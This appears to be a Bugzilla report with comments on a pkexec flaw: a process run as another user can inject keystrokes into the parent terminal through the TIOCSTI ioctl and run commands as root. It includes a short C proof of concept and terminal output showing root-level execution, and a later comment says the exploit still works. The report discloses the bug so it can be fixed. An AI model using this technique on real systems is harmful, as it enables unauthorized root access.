| [Description](show_bug.cgi?id=1299955#c0)  Federico Manuel Bento    2016-01-19 15:37:52 UTC  ``` When executing a program via "pkexec --user nonpriv program" the nonpriv session can escape to the parent session by using the TIOCSTI ioctl to push characters into the terminal's input buffer, allowing privilege escalation. This issue has been fixed in "su" [CVE-2005-4890](https://access.redhat.com/security/cve/CVE-2005-4890) by calling setsid() and in "sudo" by using the "use_pty" flag.  $ cat test.c #include <sys/ioctl.h>  int main() {  char *cmd = "id\n";  while(*cmd)   ioctl(0, TIOCSTI, cmd++); }  $ gcc test.c -o test $ id uid=1000(saken) gid=1000(saken) groups=1000(saken)  # pkexec --user saken ./test ----> last command i type in id # id ----> did not type this uid=0(root) gid=0(root) groups=0(root)   ```  [Comment 1](show_bug.cgi?id=1299955#c1)  David Lewis    2016-02-26 16:36:10 UTC  ``` You have to possess CAP_SYS_ADMIN to successfully invoke the TIOCSTI ioctl.  That implies to me that pkexec is allowing test to execute with that (and possibly other) capabilities.  If that's the case, you're merely running as root by another name.   ```  [Comment 2](show_bug.cgi?id=1299955#c2)  David Lewis    2016-02-26 19:16:52 UTC  ``` Or you can pass that tty ownership check that's been in there seemingly forever... sorry for the noise.   ```  [Comment 4](show_bug.cgi?id=1299955#c4)  Sam Morris    2024-05-02 09:04:47 UTC  ``` Has this actually been fixed? On a RHEL 8.9 system I've built the sample exploit from <https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking> and it works:    root@myhost:/var/tmp/tiocsti130# pkexec -u nobody /bin/bash   bash-4.4$ /var/tmp/tiocsti/tiocsti  # <-- this is me running the exploit, subsequent output is caused by the exploit hijacking my terminal   exit   echo Payload as `whoami`   bash-4.4$ exit   exit   root@myhost:/var/tmp/tiocsti# echo Payload as `whoami`   Payload as root   ``` |  |
